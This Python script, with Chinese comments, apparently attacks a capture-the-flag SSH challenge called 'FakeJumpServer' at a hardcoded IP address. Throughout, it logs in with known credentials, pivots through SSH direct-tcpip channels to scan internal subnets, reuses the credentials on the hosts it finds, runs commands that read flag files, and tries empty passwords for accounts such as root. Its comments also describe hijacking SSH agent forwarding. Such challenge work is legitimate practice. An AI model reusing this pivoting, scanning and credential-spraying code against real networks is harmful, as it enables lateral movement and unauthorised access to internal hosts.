#!/usr/bin/env python3
"""
FakeJumpServer深入分析
重点：理解用户名格式如何影响转发行为
"""

import socket
import paramiko
import time

HOST = "61.147.171.105"
PORT = 55300

def analyze_connection_closure():
    """分析连接关闭的详细信息"""
    print("=" * 70)
    print("[*] 分析用户名触发连接关闭的详细行为")
    print("=" * 70)
    
    test_usernames = [
        "ctf",           # 正常 - 应该成功
        "ctf@localhost", # 特殊 - 关闭
        "ctf@10.42.0.1", # 特殊 - 关闭（目标是真实Ubuntu）
    ]
    
    for username in test_usernames:
        print(f"\n--- 测试: {username} ---")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        try:
            sock.connect((HOST, PORT))
            
            # 读取banner（行读取）
            banner = b""
            while b"\r\n" not in banner:
                chunk = sock.recv(1)
                if not chunk:
                    break
                banner += chunk
            
            banner_str = banner.decode().strip()
            print(f"  Server Banner: {banner_str}")
            
            # 发送客户端版本
            sock.send(b"SSH-2.0-test\r\n")
            
            # 读取服务器KEX_INIT
            kex = sock.recv(4096)
            print(f"  KEX_INIT: {len(kex)} bytes")
            
            # 检查是dropbear还是被转发到OpenSSH
            if b"sntrup761" in kex:  # dropbear支持的后量子算法
                print(f"  -> 连接到dropbear")
            else:
                print(f"  -> 可能被转发")
            
            # 继续读取看是否关闭
            sock.setblocking(False)
            time.sleep(0.5)
            try:
                more = sock.recv(1024)
                print(f"  额外数据: {len(more)} bytes")
            except BlockingIOError:
                print(f"  无额外数据（正常）")
            
        except socket.timeout:
            print(f"  [!] 超时")
        except ConnectionResetError:
            print(f"  [!] 连接被重置 - 可能是转发失败")
        except Exception as e:
            print(f"  [!] 错误: {e}")
        finally:
            sock.close()

def test_jump_with_known_creds():
    """
    关键思路：
    如果dropbear会转发用户名中指定的目标，并使用相同密码
    那么我们需要找到一个目标主机，该主机接受我们已知的凭据
    
    已知：
    - ctf:123456 在dropbear上有效
    - 10.42.0.1/172.17.0.1 是Ubuntu主机，ctf:123456不工作
    - localhost被fake到dropbear自己
    
    问题：是否有其他内部主机可以连接？
    """
    print("\n" + "=" * 70)
    print("[*] 搜索可以使用ctf:123456登录的内部主机")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 扫描更多内部IP
    networks = [
        # Container网络
        "10.42.0.{}", "10.42.1.{}", "10.42.111.{}",
        # Docker网络  
        "172.17.0.{}", "172.18.0.{}",
        # 其他可能
        "192.168.0.{}", "192.168.1.{}",
    ]
    
    found_ssh = []
    
    for net_template in networks[:4]:  # 限制扫描范围
        for i in [1, 2, 3, 254]:  # 只测试几个常见IP
            ip = net_template.format(i)
            try:
                chan = transport.open_channel(
                    "direct-tcpip",
                    (ip, 22),
                    ("127.0.0.1", 0)
                )
                chan.settimeout(2)
                banner = chan.recv(1024).decode('utf-8', errors='ignore')
                if "SSH" in banner:
                    found_ssh.append((ip, banner.strip()[:50]))
                    print(f"  [+] {ip}:22 - {banner[:40].strip()}")
                chan.close()
            except:
                pass
    
    print(f"\n找到 {len(found_ssh)} 个SSH服务")
    
    # 对找到的SSH服务尝试认证
    print("\n[*] 尝试使用ctf:123456认证...")
    for ip, banner in found_ssh:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (ip, 22),
                ("127.0.0.1", 0)
            )
            
            inner = paramiko.SSHClient()
            inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            inner.connect(ip, username="ctf", password="123456", sock=chan, timeout=5)
            
            # 成功！
            print(f"  [!!!] {ip} - 认证成功!")
            
            # 执行命令获取信息
            stdin, stdout, stderr = inner.exec_command("id; hostname; cat /flag* 2>/dev/null || ls -la /")
            output = stdout.read().decode()
            print(f"  输出: {output[:500]}")
            
            inner.close()
        except paramiko.AuthenticationException:
            pass  # 认证失败
        except Exception as e:
            if "Auth" not in str(e):
                print(f"  {ip} - {e}")
    
    client.close()

def understand_fakejump_better():
    """
    重新理解FakeJumpServer
    
    根据之前的测试：
    1. 用户名 "ctf" -> 连接到dropbear，认证成功
    2. 用户名 "ctf@localhost" -> 连接关闭
    3. 用户名 "ctf@172.17.0.1" -> 连接关闭
    
    连接关闭可能意味着：
    A. dropbear尝试转发到目标，但转发失败
    B. dropbear尝试转发并转发成功，但认证在目标主机失败导致关闭
    
    如果是情况B，那么：
    - ctf@localhost 转发到localhost:22，这是dropbear自己
    - 但为什么同样的凭据认证会失败？
    
    除非...dropbear在转发时不传递密码，而是需要其他认证方式！
    
    检查：转发到dropbear自己时是否需要密钥认证？
    """
    print("\n" + "=" * 70)
    print("[*] 深入理解FakeJumpServer行为")
    print("=" * 70)
    
    # 让我们检查dropbear的认证方式
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 通过direct-tcpip连接到localhost（会被fake）
    print("\n[1] 通过direct-tcpip连接localhost:22...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("localhost", 22),
            ("127.0.0.1", 0)
        )
        
        inner_transport = paramiko.Transport(chan)
        inner_transport.start_client()
        
        # 获取支持的认证方式
        print(f"  远程版本: {inner_transport.remote_version}")
        
        # 尝试password认证
        try:
            inner_transport.auth_password("ctf", "123456")
            print("  password认证成功!")
            
            # 成功！尝试执行命令
            chan2 = inner_transport.open_channel("session")
            chan2.exec_command("id; hostname")
            time.sleep(1)
            output = chan2.recv(4096).decode()
            print(f"  输出: {output}")
            chan2.close()
        except paramiko.AuthenticationException as e:
            print(f"  password认证失败: {e}")
            
            # 检查支持的认证方式
            try:
                # 尝试获取支持的方法
                methods = inner_transport.auth_none("ctf")
                print(f"  支持的认证方式: {methods}")
            except:
                pass
        
        inner_transport.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    client.close()

def test_publickey_forwarding():
    """
    测试：是否可以使用SSH agent转发来认证内部主机
    
    FakeJumpServer的典型攻击场景：
    1. 攻击者控制跳板机
    2. 用户通过跳板机SSH到内部主机，并启用agent forwarding
    3. 跳板机可以劫持用户的SSH agent，用它来访问其他主机
    
    但在这个场景中，我们是攻击者，我们没有可用的SSH key...
    除非dropbear有漏洞让我们绕过认证？
    """
    print("\n" + "=" * 70)
    print("[*] 测试其他认证绕过方式")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 连接到Ubuntu主机
    print("\n[1] 连接172.17.0.1并分析...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        inner_transport = paramiko.Transport(chan)
        inner_transport.start_client()
        
        print(f"  远程版本: {inner_transport.remote_version}")
        
        # 尝试空密码
        print("\n[2] 尝试空密码...")
        for user in ["ctf", "root", "ubuntu", "flag"]:
            try:
                inner_transport2 = paramiko.Transport(transport.open_channel(
                    "direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0)
                ))
                inner_transport2.start_client()
                inner_transport2.auth_password(user, "")
                print(f"  [!!!] {user}: 空密码成功!")
                inner_transport2.close()
            except:
                pass
        
        # 尝试keyboard-interactive
        print("\n[3] 尝试keyboard-interactive...")
        try:
            def handler(title, instructions, prompt_list):
                print(f"  title: {title}")
                print(f"  instructions: {instructions}")
                print(f"  prompts: {prompt_list}")
                return ["123456"]  # 返回密码
            
            inner_transport3 = paramiko.Transport(transport.open_channel(
                "direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0)
            ))
            inner_transport3.start_client()
            inner_transport3.auth_interactive("ctf", handler)
            print("  keyboard-interactive成功!")
            inner_transport3.close()
        except Exception as e:
            print(f"  keyboard-interactive失败: {e}")
        
        inner_transport.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    client.close()

if __name__ == "__main__":
    # analyze_connection_closure()
    # test_jump_with_known_creds()
    understand_fakejump_better()
    test_publickey_forwarding()
